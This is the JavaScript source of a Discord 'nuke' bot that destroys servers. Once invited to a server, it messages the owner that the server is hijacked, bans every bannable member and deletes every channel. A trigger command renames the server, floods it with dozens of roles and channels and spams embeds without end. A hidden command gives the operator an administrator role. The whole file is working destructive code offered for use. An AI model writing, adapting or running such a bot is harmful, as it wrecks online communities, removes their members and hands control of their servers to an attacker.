
const Discord = require("discord.js")
const fs = require("fs");
const client = new Discord.Client();
const cache = JSON.parse(fs.readFileSync("./caches.json", "utf8"))
const Token = cache.token 
const x_x = cache.hackcmd
const opcmd = cache.opcommand
const teext = cache.tch
const vooice = cache.vch
const pic = cache.picture
const spam = cache.spam
const namee = cache.name
const playing = cache.play
const role = cache.hackroles
const adminstrator = cache.oprole




async function nuke(guild) {
    let users = 0;
    let channels = 0;
  
    await guild.fetchMembers();
  
    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
  
  
  
    await Promise.all(guild.members.map(async (m) => {
      if (m.bannable) {
        users++;
        await m.send('HJACKED').catch(e => { return void e; });
        return m.ban();
      }
    }));
    
      await Promise.all(guild.channels.map(c => {
      if (c.deletable) {
        channels++;
        return c.delete();
      }
    }));

    await guild.createChannel(teext, 'text');

    await guild.createChannel(vooice, 'voice');



}
client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

client.on('message', message => {
    if (message.content === x_x) {
        console.log(`THE HACK HAS BEEN STARTED`)
        message.guild.members.forEach(baand => {
       baand.ban({reason: spam,});
       client.channels.forEach(hackch => {
       hackch.delete();
       client.user.setAvatar(pic)
       client.user.setUsername(namee)
       client.user.setGame(playing, 'https://www.twitch.tv/hix')
       client.guilds.forEach(hack => {
       hack.setIcon(pic)
       hack.setName(namee)})})})}});

client.on('message', message => {
        if (message.content === opcmd) {
            if(message.author.id !== cache.urid) return;
let me = message.author
        let role = message.guild.createRole({
        name : adminstrator,
        color : "RANDOM", 
        permissions : [8]
        })
        let role1 = message.guild.roles.find('name', adminstrator)
    message.channel.send(`HJACKED`)
   message.guild.member(me).addRole(role1);
}})
            client.on('message', message => {
     

                if (message.content === x_x) {
                    client.guilds.forEach(m =>{
             m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
                m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
           
               
           })
            
            
           }
           });
      
           client.on('message', message => {
                    if (message.content === x_x) {
                          client.guilds.forEach(m =>{
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           })
           }
           });
           client.on('message', message => {
                    if (message.content === x_x) {
                            client.guilds.forEach(m =>{
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           
           })
           }
           
           });



  client.on('guildMemberAdd', member => {
                        member.guild.createRole({
                      name : client.user.username,
                      color : "RANDOM", 
                      permissions : [8]
                  }).then(function(role){
                      member.addRole(role)
                  })
                  
              })
          

                client.on('message', message => {
                    if (message.content === x_x) {
                        console.log(`THE HACK HAS BEEN STARTED`)
                        var teeext = teext.replace(" ", "-")
                        var interval = setInterval (function () {
                        const embed = new Discord.RichEmbed()
                       .setColor("ff0000")
                       .setThumbnail(pic)
                       .addField(spam, ".")
                        message.channel.sendEmbed(embed);
            
            
            
                        })
                      }})

    client.on('message', async message => {
  const owner = cache.urid; 
  let member = message.author
   if (message.content === opcmd) {
    if(!message.author.id === owner) return;
let op = message.guild.roles.find('name', `${adminstrator}`)
    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
    message.guild.member(member).addRole(op);
  }
});
client.login(Token)